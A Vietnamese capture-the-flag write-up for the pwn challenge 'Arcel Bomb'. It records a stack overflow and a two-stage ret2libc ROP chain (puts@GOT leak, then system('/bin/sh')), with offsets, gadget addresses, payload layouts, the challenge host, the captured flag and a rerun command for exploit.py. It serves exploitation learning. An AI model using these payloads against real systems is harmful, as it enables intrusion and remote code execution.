# notes.md - Arcel Bomb (pwn)

## H1 - phân loại: stack buffer overflow thuần trong `vuln()`
target: `dispatch` + `libc.so.6` + `ld` từ `dispatch.zip`
evidence: `read(0, rbp-0x40, 0x200)` với buffer 0x40; không `__stack_chk_fail`; `offset(retaddr) = 0x48 = 72`
result: CONFIRMED - banner từ `pwn.h7tex.com:41136` khớp 100% chuỗi trong binary nên instance chạy đúng file đã cho

## H2 - có "spare key" sẵn trong binary không?
target: `readelf --dyn-syms`, `strings -t x`
evidence: PLT chỉ có `puts/read/setvbuf/__libc_start_main`; không có `system/execve`, không có chuỗi `/bin/sh`; không có hàm `win()`; `pop_rdi_ret @0x401176` được cố tình để sẵn
result: DEAD cho nhánh "ret vào win function có sẵn" - đề nói đúng, phải tự tạo đường vào (libc ROP)

## H3 - Full RELRO chặn gì, còn lại gì
target: `readelf -l` (GNU_RELRO 0x403df8 size 0x208)
evidence: `.got/.got.plt` nằm trong vùng RELRO -> không ghi được GOT; NX -> không shellcode trên stack; không PIE -> mọi địa chỉ trong `dispatch` đã biết trước
result: CONFIRMED - nên hướng duy nhất còn lại là ROP sang libc, mà libc thì ASLR

## H4 - không có hàm nào in nội dung buffer -> lấy leak bằng ROP, không phải brute force ASLR
target: một payload duy nhất, hai stage
evidence:
- program chỉ in `prompt / "waybill logged."`, `read` không echo -> zero leak trong logic
- `main` gọi `setvbuf(stdout, NULL, _IONBF, 0)` -> leak trả về ngay, không bị kẹt trong buffer
- `puts@GOT` ở `0x404000` đã được resolve (prompt đã gọi `puts`) -> `puts(0x404000)` in 6 byte con trỏ libc
- jump trả về `vuln (0x401178)` để overflow lần hai trong cùng connection
did: stage 1 = `pad(72) | pop_rdi_ret | 0x404000 | ret | puts@plt | ret | vuln`
result: CONFIRMED - leak về `c0 7c 88 ed ae 7f` = `0x7faeed887cc0`; `-0x87cc0` = `0x7faeed800000`, page-aligned

## H5 - căn chỉnh stack (đây là chỗ dễ sai nhất)
evidence: tại `ret` của `vuln`, `rsp` sau khi pop địa chỉ trả về đầu tiên `≡ 0 (mod 16)`; mỗi gadget `pop_rdi_ret` làm lệch 8 byte; ABI cần callee thấy `rsp ≡ 8 (mod 16)`
phân tích:
- `S` (rsp lúc vào `vuln`) `≡ 8 (mod 16)` -> không chèn `ret` thì `puts` nhận `rsp ≡ 0` -> SIGSEGV trong `movaps`
- stage 1 phải pop **chẵn** qword, nếu không frame `vuln` lần hai bị lệch 8 byte và chính `puts("waybill logged.")` bên trong nó crash
- stage 1 dùng 6 qword (48 byte) -> `vuln` lần hai vào với `rsp ≡ 8 (mod 16)` như bình thường
did: chèn `ret (0x401177)` trước mỗi call target
result: CONFIRMED - cả hai lần `puts` và `system` chạy không crash, không cần thử lại alignment

## H6 - stage 2: `system("/bin/sh")`
target: libc offsets `system=0x58750`, `"/bin/sh"=0x1cc42f`
did: stage 2 = `pad(72) | pop_rdi_ret | base+0x1cc42f | ret | base+0x58750`, rồi gửi lệnh qua cùng socket
result: CONFIRMED - `uid=0(root)`, cwd `/`, `/flag` (44 byte) world-readable

## Lỗi đã gặp
1. Lần chạy đầu báo `unexpected leak length (7)`: `puts` tự thêm `\n` -> byte cuối của seg là `0a`, không phải của con trỏ. Sửa: strip `\n` rồi mới kiểm tra độ dài. Không phải lỗi chain.
2. `until(PROMPT, count=2)` làm mỗi attempt chờ timeout 6s (đúng 1 prompt xuất hiện sau stage 1). Sửa thành `count=1`.

## Primitive cuối cùng
1 connection, 2 lần `sendall`:
`stage1(120 B) -> leak libc base -> stage2(104 B) -> cmd`
Flag (verbatim trong bytes nhận được): `H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}`
Chạy lại: `python exploit.py pwn.h7tex.com 41136 "cat /flag"`

## Không chạy được local
Host win32/Git Bash không có qemu/docker/wsl distro -> không thi hành ELF được; toàn bộ confirmation làm trực tiếp trên instance (mỗi attempt chỉ 1 connection, có timeout).
